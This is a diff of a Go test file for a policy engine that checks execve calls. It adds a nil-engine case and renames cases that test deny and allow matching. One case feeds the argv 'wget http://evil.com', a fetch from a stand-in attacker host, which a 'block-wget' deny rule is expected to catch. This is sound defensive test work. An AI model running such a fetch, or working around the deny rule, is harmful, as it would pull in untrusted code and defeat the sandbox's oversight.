@@ -394,9 +394,19 @@ func TestEngine_TransparentOverrides(t *testing.T) {
 		overrides := e.TransparentOverrides()
 		assert.Nil(t, overrides)
 	})
+
+	t.Run("returns nil on nil engine", func(t *testing.T) {
+		var e *Engine
+		overrides := e.TransparentOverrides()
+		assert.Nil(t, overrides)
+	})
 }
 
-func TestEngine_CheckExecve_TransparentUnwrapScenarios(t *testing.T) {
+// TestEngine_CheckExecve_PostUnwrapEvaluation verifies that CheckExecve correctly
+// evaluates commands as they would appear after transparent unwrap (bare basename at
+// depth > 0). The actual unwrap logic is tested in execve_handler_test.go; this test
+// confirms the engine matches post-unwrap inputs correctly.
+func TestEngine_CheckExecve_PostUnwrapEvaluation(t *testing.T) {
 	p := &Policy{
 		Version: 1,
 		Name:    "test-transparent-unwrap",
@@ -441,7 +451,7 @@ func TestEngine_CheckExecve_TransparentUnwrapScenarios(t *testing.T) {
 			wantRule: "block-wget",
 		},
 		{
-			name:     "unwrapped wget denied by basename",
+			name:     "bare basename at depth 1 matches deny rule",
 			filename: "wget",
 			argv:     []string{"wget", "http://evil.com"},
 			depth:    1,
@@ -449,7 +459,7 @@ func TestEngine_CheckExecve_TransparentUnwrapScenarios(t *testing.T) {
 			wantRule: "block-wget",
 		},
 		{
-			name:     "env allowed as wrapper",
+			name:     "wrapper command matched by its own allow rule",
 			filename: "/usr/bin/env",
 			argv:     []string{"env", "wget"},
 			depth:    0,
@@ -457,7 +467,7 @@ func TestEngine_CheckExecve_TransparentUnwrapScenarios(t *testing.T) {
 			wantRule: "allow-env",
 		},
 		{
-			name:     "canonicalized path matches",
+			name:     "full path matches basename rule",
 			filename: "/usr/bin/git",
 			argv:     []string{"git", "status"},
 			depth:    0,
